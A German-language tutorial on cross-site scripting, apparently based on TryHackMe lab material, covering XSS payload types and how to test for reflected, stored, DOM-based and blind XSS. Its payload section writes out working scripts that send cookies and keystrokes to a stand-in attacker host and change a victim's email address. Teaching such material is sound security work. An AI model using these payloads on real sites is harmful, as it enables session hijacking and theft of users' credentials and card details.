Cross-Site Scripting, in der Cybersecurity-Community besser bekannt als XSS, wird als Injektionsangriff eingestuft, bei dem bösartiges JavaScript in eine Webanwendung eingeschleust wird, mit der Absicht, von anderen Benutzern ausgeführt zu werden.

##### Was ist eine XSS Payload?

Bei XSS Schwachstellen handelt es sich bei der Payload um Java Script Code der auf der Zielmaschine ausgeführt werden soll. 
Die Payload wird in zwei Teile Aufgeteilt. Die Intention und die Modification. 

Die Intention ist das was das Java Script tatsächlich tun soll, und die Modifikation ist die Änderung des Codes die wir brauchen damit der Code ausgeführt wird.

Hier ein paar beispiele zu XSS Intentions: 

PoC (Proof of Concept):
```
<script>alert('XSS');</script>
```
Das ist eine der Einfachsten Payloads, mit der Man demonstrieren möchte das es eine XSS Schwachstelle gibt. Diese Payload sorgt dafür das eine Alert Box sich öffnet mit einem Simplen Text String.

Session Stealing: 
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
Da Deteils einer user Session meistens in den Cookies gespeichert werden, sorgt dieses Script dafür, dass die Cookies von dem Zielgerät genommen werden, Base64 verschlüsselt werden und sendet sie dann an eine vom Hacker kontrollierte Website, um sie zu protokollieren. Sobald der Hacker diese Cookies hat, kann er die Sitzung der Zielperson übernehmen und als dieser Benutzer protokolliert werden.

KeyLogger
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
Der Code Fungiert als Keylogger, d.h. alles was das Ziel auf der Website schreibt wird zu einem Server unter Kontrolle des Angreifers weitergeleitet. Das lohnt sich zum Beispiel bei Credit Karten Infos

Business Logic:
Diese Nutzlast ist sehr viel spezifischer als die obigen Beispiele. Hier geht es um den Aufruf einer bestimmten Netzwerkressource oder einer JavaScript-Funktion. Stellen Sie sich zum Beispiel eine JavaScript-Funktion zum Ändern der E-Mail-Adresse des Benutzers mit dem Namen `user.changeEmail()` vor. Ihr Payload könnte wie folgt aussehen:
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```
Da nach Ausführung von diesem Script die Email Adresse des Accounts geändert wurde kann der Angreifer nun z.B. das Passwort wechseln


### Reflected XSS

Reflected XSS tritt auf, wenn vom Benutzer bereitgestellte Daten in einer HTTP-Anfrage ohne jegliche Validierung in den Webseiten-Quellcode aufgenommen werden.
Beispiel zur Erläuterung:_
Eine Website die bei Falschem Input eine Error Nachricht Anzeigt. Der Inhalt der Fehlermeldung wird aus dem Error parameter im Query-String übernommen und direkt in den Seitenquelltext eingebaut.
https://imgur.com/0Wq8biY
Die Anwendung Kontrolliert den Inhalt des Error Parameters nicht, was dem Angreifer erlaubt hier Schad Code einzubauen. Dies könnte dann so aussehen:
https://imgur.com/4o5Z9Y3

##### Wie Teste ich auf Reflected XSS Schwachstellen?
Dazu muss man jeden möglichen Einstiegspunkt testen, z. B:
Parameter im URL Query String
URL-Dateipfad
Manchmal HTTP-Header (obwohl es unwahrscheinlich ist, dass sie in der Praxis ausgenutzt werden können)

Sobald man Daten gefunden hat, die in der Webanwendung widergespiegelt werden, muss man bestätigen, dass man seine JavaScript-Payload erfolgreich ausführen kann; die Payload hängt davon ab, wo in der Anwendung Ihr Code widergespiegelt wird 

### Stored XSS

Wie der Name schon sagt, wird die XSS-Payload in der Webanwendung (z. B. in einer Datenbank) gespeichert und dann ausgeführt, wenn andere Benutzer die Website oder Webseite besuchen.

Bsp.:
https://imgur.com/FCY0k0M

##### Wie Teste ich auf Stored XSS Schwachstellen?
Man muss jeden möglichen Einstiegspunkt testen, an dem Daten gespeichert werden und dann in Bereichen angezeigt werden, auf die andere Benutzer Zugriff haben; ein kleines Beispiel hierfür könnten sein:
Kommentare in einem Blog
Benutzerprofilinformationen
Website-Auflistungen
-> Manchmal Ist bei einer Website lediglich eine Begrenzung von Eingabewerten nur auf der Client Site, so dass das Ändern von Werten in etwas, das die Webanwendung nicht erwarten würde, eine gute Quelle für die Entdeckung von gespeichertem XSS ist z.B. ein Feld zur Alters Erfassung. das eine ganze Zahl aus einem Dropdown-Menü erwartet, aber stattdessen sendet man die Anfrage manuell (bsp. via Burp), anstatt das Formular zu verwenden, was es einem ermöglicht, bösartige Nutzdaten zu testen.


### DOM Based XSS

Begriffserklärung DOM 
DOM Steht für Document Object Model und ist ein Programmier interface für HTML und XML Dokumente. Es stellt die Seite so dar, dass Programme die Struktur, den Stil und den Inhalt des Dokuments ändern können. Eine Webseite ist ein Dokument, und dieses Dokument kann entweder im Browserfenster oder als HTML-Quelle angezeigt werden. Ein Diagramm des HTML-DOM ist unten abgebildet:
Bsp.:
https://imgur.com/Hrkr8s2
Weitere infos zu DOM Dokumenten gibt es auf https://www.w3.org/TR/REC-DOM-Level-1/introduction.html


##### Wie wird DOM exploited?

DOM-basiertes XSS bedeutet, dass die JavaScript-Ausführung direkt im Browser erfolgt, ohne dass neue Seiten geladen oder Daten an den Backend-Code übermittelt werden. Die Ausführung erfolgt, wenn der JavaScript-Code der Website auf Eingaben oder Benutzerinteraktionen reagiert.

Beispiel Szenario:
Eine Website mit Java Script bekommt Inhalte aus dem "window.location.hash" parameter und schreibt diese Inhalte auf die aktuell gezeigte website. Allerdings werden die Inhalte dieser Hashes nicht auf malicious code gechecked. Dies Ermöglicht es einen Angreifer hier JavaScript einzubauen wie es ihm gefällt.

##### Wie Teste ich auf DOM Based XSS?
DOM-basiertes XSS kann schwierig zu testen sein und erfordert ein gewisses Maß an Kenntnissen über JavaScript, um den Quellcode zu lesen. Man muss nach Teilen des Codes suchen, die auf bestimmte Variablen zugreifen, über die ein Angreifer die Kontrolle haben können, wie z. B. „window.location.x“-Parameter.
Wenn man solche Teile des Codes gefunden hat, muss man sehen, wie sie behandelt werden und ob die Werte jemals in das DOM der Webseite geschrieben oder an unsichere JavaScript-Methoden wie eval() übergeben werden.


### Blind XSS

Blind XSS ähnelt einem gespeicherten XSS, bei dem Ihre Nutzdaten auf der Website gespeichert werden, so dass ein anderer Benutzer sie sehen kann, aber in diesem Fall kann man nicht sehen, wie die Nutzdaten funktionieren, und kann sie auch nicht zuerst an sich selbst testen.

##### Beispiel-Szenario:
Eine Website verfügt über ein Kontaktformular, über das man einem Mitarbeiter eine Nachricht zukommen lassen kann. Der Inhalt der Nachricht wird nicht auf bösartigen Code geprüft, so dass der Angreifer alles eingeben kann, was er möchte. Diese Nachrichten werden dann in Support-Tickets umgewandelt, die die Mitarbeiter in einem privaten Webportal einsehen können.

##### Wie Teste ich auf Blind XSS?

Wenn man auf eine Blind XSS Testet muss man sicherstellen ein "Call back" implementiert zuhaben (Meistens via HTTP request). Dadurch bekommt man dann mit ob die Payload umgesetzt hat oder nicht.

Ein populäres Tool für Blind XSS angriffe ist XSS Hunter Express. Es ist zwar möglich, ein eigenes Tool in JavaScript zu erstellen, aber dieses Tool erfasst automatisch Cookies, URLs, Seiteninhalte und mehr.
Link XSS Hunter Express:
https://github.com/mandatoryprogrammer/xsshunter-express


### Beispiel Payloads 

Besser Aufbereitet Als Screenshots

Einleitung und Reflected im Code: 
http://imgur.com/zPpS6OY

Reflected in Input Tag
https://imgur.com/DiZpJN8

Stored mit Textarea
https://imgur.com/J9QLhwG

Reflected in JavaScript Code und Gefiltert nach Gefährlichen Wörtern
https://imgur.com/Chf0K99

Gefiltert mit Weiteren Attributen wie .img Seperat Polyglots
https://imgur.com/yrVwRww

Praktisches Beispiel einer Blind XSS 

https://imgur.com/TW8MH1P
https://imgur.com/s6Uifgc